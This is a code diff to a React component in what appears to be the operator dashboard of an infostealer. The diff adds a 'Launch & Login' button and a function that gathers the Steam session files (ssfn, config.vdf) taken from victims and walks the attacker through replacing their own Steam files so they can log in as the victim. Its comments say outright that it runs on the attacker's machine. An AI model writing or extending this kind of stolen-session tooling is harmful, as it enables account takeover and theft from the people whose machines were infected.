@@ -7,7 +7,7 @@ import {
   SteamAccountEntry,
   ExtractedFile,
 } from "../../types";
-import { IconSteam, IconUser, IconRefresh, IconFileText } from "@tabler/icons-react";
+import { IconSteam, IconUser, IconRefresh, IconFileText, IconLogin } from "@tabler/icons-react";
 
 export const SteamAccount: React.FC = () => {
   const { addr } = useParams();
@@ -49,6 +49,29 @@ export const SteamAccount: React.FC = () => {
       setStatus("Request failed");
       setLoading(false);
     }
+  };
+
+  const launchWithAccount = (account: SteamAccountEntry) => {
+    // We'll simulate the "Login" by providing instructions or preparing a local script
+    // Since we are in the server (attacker machine), we can't directly launch the victim's steam
+    // But we can help the attacker use the collected session files.
+    const ssfnFiles = steamFiles.filter(f => f.path.toLowerCase().includes("ssfn"));
+    const configFile = steamFiles.find(f => f.path.toLowerCase().includes("config.vdf"));
+
+    if (ssfnFiles.length === 0 || !configFile) {
+        alert("Missing session files (ssfn or config.vdf) for auto-login. Make sure they were extracted.");
+        return;
+    }
+
+    // Prepare a download/copy instruction for the attacker
+    const msg = `To login as ${account.account_name}:
+1. Close your local Steam client.
+2. Replace your 'config/config.vdf' with the extracted one.
+3. Place the extracted 'ssfn' files in your Steam root directory.
+4. Launch Steam with: steam.exe -login ${account.account_name}`;
+
+    console.log(msg);
+    alert(msg);
   };
 
   return (
@@ -142,18 +165,33 @@ export const SteamAccount: React.FC = () => {
                       key={index}
                       className="rounded-2xl border border-[#1a1a1a] p-4 bg-[#111]"
                     >
-                      <div className="flex items-center gap-3 mb-3">
-                        <div className="p-2 bg-[#1a1a1a] rounded-lg">
-                          <IconUser size={18} className="text-accentx" />
-                        </div>
-                        <div>
-                          <div className="text-sm font-semibold text-white">
-                            {account.account_name || account.persona_name || account.steam_id}
+                      <div className="flex items-center justify-between mb-3">
+                        <div className="flex items-center gap-3">
+                          <div className="w-12 h-12 bg-[#1a1a1a] rounded-lg overflow-hidden border border-[#2a2a2a]">
+                            {account.avatar_url ? (
+                                <img src={account.avatar_url} alt="Avatar" className="w-full h-full object-cover" />
+                            ) : (
+                                <div className="w-full h-full flex items-center justify-center">
+                                    <IconUser size={24} className="text-accentx" />
+                                </div>
+                            )}
                           </div>
-                          <div className="text-xs text-gray-400">
-                            Steam ID: {account.steam_id}
+                          <div>
+                            <div className="text-sm font-semibold text-white">
+                              {account.account_name || account.persona_name || account.steam_id}
+                            </div>
+                            <div className="text-xs text-gray-400">
+                              Steam ID: {account.steam_id}
+                            </div>
                           </div>
                         </div>
+                        <button
+                            onClick={() => launchWithAccount(account)}
+                            className="p-2 bg-accentx/10 hover:bg-accentx/20 text-accentx rounded-xl transition border border-accentx/20"
+                            title="Launch & Login"
+                        >
+                            <IconLogin size={18} />
+                        </button>
                       </div>
                       <div className="space-y-1 text-xs text-gray-400">
                         <div>Persona: {account.persona_name}</div>
